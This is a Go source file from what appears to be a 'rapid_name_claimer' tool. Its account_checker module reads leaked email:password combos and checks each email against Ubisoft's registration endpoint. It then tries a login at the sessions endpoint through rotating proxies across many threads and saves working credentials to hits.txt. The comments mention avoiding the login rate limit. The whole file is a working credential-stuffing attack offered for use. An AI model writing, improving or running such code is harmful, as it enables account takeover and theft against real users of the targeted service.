package account_checker

// Import Packages
import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"time"

	Global "rapid_name_claimer/global"
	Queue "rapid_name_claimer/queue"

	"github.com/gookit/color"
	"github.com/valyala/fasthttp"
)

// Define Global Variables
var (
	// Counter Variables
	totalRequests        int64 = 1
	hitCount, errorCount int   = 0, 0
	// Amount of accounts in combos.txt
	accountCount int = Global.FileNewLineCount("data/account_checker/combos.txt")
	// Account Combos Queue
	AccountQueue *Queue.ItemQueue = Global.AddToQueue(Queue.Create(), "data/account_checker/combos.txt")
)

// The LiveCounter() function is used to display all of
// the stats for the account checker. This includes the
// amount of hits, checked, errors, etc.
func LiveCounter(programStartTime *int64, threadCount int) {
	var reqsPerSecond int64 = totalRequests / ((time.Now().Unix() - *programStartTime) + 1)
	color.Printf(
		"\033[H\033[2J\033[0;0H%s\n\n\033[1;37m ┃ \033[1;34m\033[1;37m\033[1;34m Accounts \033[1;97m[\033[1;33m%d\033[1;97m]\033[1;34m\n\033[1;37m ┃ \033[1;34m\033[1;37m\033[1;34m Threads \033[1;97m[\033[1;35m%d\033[1;97m]\033[1;34m\n\033[1;37m ┃ \033[1;34m\033[1;37m\033[1;34m Proxies \033[1;97m[\033[1;30m%d\033[1;97m]\033[1;34m\n\033[1;37m ┃ \033[1;34m\033[1;37m\033[1;34m Hits \033[1;97m[\033[1;32m%d\033[1;97m]\033[1;34m\n\033[1;37m ┃ \033[1;34m CPS \033[1;97m[\033[1;36m%d/s\033[1;97m]\033[1;34m\n\033[1;37m ┃ \033[1;34m\033[1;37m\033[1;34m Checked \033[1;97m[\033[1;32m%d\033[1;97m]\033[1;34m\n\033[1;37m ┃ \033[1;34m Errors \033[1;97m[\033[1;31m%d\033[1;97m]\033[1;34m\n\n \033[1;31m%s",
		Global.RapidLogoString, accountCount, threadCount, Global.ProxyQueue.Size(), hitCount, reqsPerSecond, totalRequests, errorCount, Global.CurrentError)
}

// The CreateRequestObject() is used to create the fasthttp request
// object that is being used for sending the http request to the
// ubisoft api endpoint.
func CreateRequestObject(auth string) *fasthttp.Request {
	// Define Variables
	var (
		// Create the request object
		req *fasthttp.Request = Global.SetRequest("POST")
		// Marshal the body being sent in the request
		data, _ = json.Marshal(map[string]interface{}{"rememberMe": false})
	)

	// Set the request url, headers and body
	req.SetRequestURI(Global.GetCustomUrl() + "v3/profiles/sessions")
	req.Header.Set("Authorization", "Basic "+auth)
	req.SetBody(data)

	// Return the request object
	return req
}

// The HandleResponse() function is used for handling the validation
// response from HandleEmailCheckResponse(). I decided to use
// the validation endpoint and this to prevent ratelimiting the shit
// out of the login endpoint.
func HandleValidateResponse(RequestClient *fasthttp.Client, account string) {
	Global.SetProxy(RequestClient)

	// Define Variables
	var (
		// Base64 the account email:password
		auth string = base64.StdEncoding.EncodeToString([]byte(account))
		// Create the request object
		req *fasthttp.Request = CreateRequestObject(auth)
		// Create the response object
		resp *fasthttp.Response = Global.SetResponse(false)
		// Send the http request
		err error = RequestClient.DoTimeout(req, resp, time.Second*6)
	)
	// Release the request and response as
	// they are both no longer needed after the
	// function is returned
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	// If no errors occured and the response status code is 200 (success)
	if resp.StatusCode() == 200 && err == nil {
		// Write the combo to the hits.txt file
		go Global.WriteToFile("data/account_checker/hits.txt", account)
		hitCount++
	} else {
		// Set the current error if the error isn't nil
		// and the status code doesn't equal 401 (invalid credentials code)
		if err != nil || resp.StatusCode() != 401 {
			Global.CurrentError = fmt.Sprintf(" >> Session Login Error: %d: %v: %s", resp.StatusCode(), err, string(resp.Body()))
			errorCount++
		}
	}
}

// The HandleEmailCheckResponse() function is used for checking
// whether the combo's email is already registered.
// If it is, then call the HandleValidateResponse() function
// in a goroutine for logging into the account
func HandleEmailCheckResponse(RequestClient *fasthttp.Client, account string, resp *fasthttp.Response, err error) {
	defer fasthttp.ReleaseResponse(resp)
	totalRequests++

	// If the error is nil and the status code is 200 (success)
	if err == nil && resp.StatusCode() == 200 {
		// Check if the response body contains the string
		// determining whether the email is already registered
		var body string = strings.ToLower(string(resp.Body()))
		if strings.Contains(body, "email address already registered") {
			// Run the handler function
			HandleValidateResponse(RequestClient, account)
		}
	} else

	// Set the current error and increase the error count
	{
		Global.CurrentError = fmt.Sprintf(" >> Email Check Error: %d: %v: %s", resp.StatusCode(), err, string(resp.Body()))
		errorCount++
	}
}

// The Start() function is used to start all of
// the goroutines and functions that are used
// for checking the accounts in combos.txt
func Start(threadCount int) {
	// Define Variables
	var (
		// Used for tracking requests per second
		programStartTime int64 = time.Now().Unix()
		// Wait group for goroutines
		waitGroup *sync.WaitGroup = &sync.WaitGroup{}
	)
	waitGroup.Add(1)

	// Iterate over the threadCount
	for i := 0; i < threadCount; i++ {
		// Run everything below in a goroutine
		go func() {
			// Request Client for sending http requests
			var RequestClient *fasthttp.Client = Global.SetClient()

			for AccountQueue.IsNotEmpty() {
				// Display the checker info
				LiveCounter(&programStartTime, threadCount)

				// Define Variables
				var (
					// Get the combo from the account queue
					account string = AccountQueue.Grab().(string)
					// Send the validation request using the request client and email
					resp, err = Global.AccountValidationRequest(RequestClient, strings.Split(account, ":")[0])
				)
				// Handle the above response
				HandleEmailCheckResponse(RequestClient, account, resp, err)
			}
		}()
	}
	waitGroup.Wait()
}
